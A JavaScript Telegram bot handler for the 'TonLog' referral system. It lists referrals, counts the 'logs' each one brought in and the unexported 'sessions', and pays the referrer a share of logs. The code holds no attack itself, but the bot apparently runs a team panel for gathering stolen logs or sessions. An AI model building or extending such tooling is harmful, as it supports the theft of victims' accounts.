import commission from "../../../database/schemas/commission.js";
import { bot } from "../../index.js";
import User from "../../../database/schemas/user.js";
import Database from "../../../database/index.js";
import { declineDays } from "../../../utils/index.js";

export default {
    name: "ref_system",
    async exec(query, [action, id]) {
        const user = await Database.getUser(query.from.id);
        const ref = await User.find({ ref: user.id });
        const statistic = await Database.getRefStatistic();
        const com = await commission.findOne({});
        console.log(action);
        if(action === 'refs_list'){
            const users_keyboard = ref.map(user => {
                return [
                    {
                        text: user.id,
                        callback_data: `ref_system:user_info:${user.id}`
                    }
                ]
            })
            users_keyboard.push([{
                text: '🔙 Назад',
                callback_data: 'ref_system'
            }])
            return bot.editMessageCaption(query, `<b>👥 Ваши рефералы.</b>
                `, {
                parse_mode: 'HTML',
                message_id: query.message.message_id,
                chat_id: query.message.chat.id,
                reply_markup: {
                    inline_keyboard: users_keyboard
                }
            })
        }
        if(action === 'user_info'){
            const user = await Database.getUser(id);
            const user_statistic = await Database.getUserStatistic(id);
            const registeredDays = Math.floor((Date.now() - user.reg) / (1000 * 60 * 60 * 24));
            const registered = declineDays(registeredDays);
        

            return bot.editMessageCaption(query, `*🫂 Реферал:* \`${user.id}\`
*🔗 Присоединился по ссылке:* https://t\\.me/tonlogpanelbot?start\\=${user.ref}

>*🚀 Принесено логов:*
>*За сегодня: ${user_statistic.todayLogs || 0}*
>*За месяц: ${user_statistic.monthLogs || 0}*
>*За всё время: ${user_statistic.allLogs || 0}*

*📝 В команде:* ${registered}`, {
                parse_mode: 'MarkdownV2',
                message_id: query.message.message_id,
                chat_id: query.message.chat.id,
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '🔙 Назад',
                            callback_data: 'ref_system:refs_list'
                        }]
                    ]
                }
            });
        }
        await bot.editMessageCaption(query, `*🫂 Реферальная система TonLog*

*⚡️ Количество партнеров:* ${ref.length}
*🔗 Ваша ссылка:* https://t\\.me/tonlogpanelbot?start\\=${user.id}

>*📊 Получено логов с реферальной системы:*
>За сегодня: ${statistic.todayLogs || 0}
>За месяц: ${statistic.monthLogs || 0}
>За всё время: ${statistic.allLogs || 0}

*📁 Не выгруженных сессий с партнеров*: ${statistic.notLoadedSessions || 0}
*💸 Ваш доход:* \`Каждый ${com.ref} лог\``, {
            parse_mode: 'MarkdownV2',
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '📩 Выгрузить',
                            callback_data: 'export'
                        },
                        {
                            text: '👥 Рефералы',
                            callback_data: 'ref_system:refs_list'
                        }
                    ],
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'start'
                        }
                    ]
                ]
            }
        }, 'cdn/menu.png');
    }
}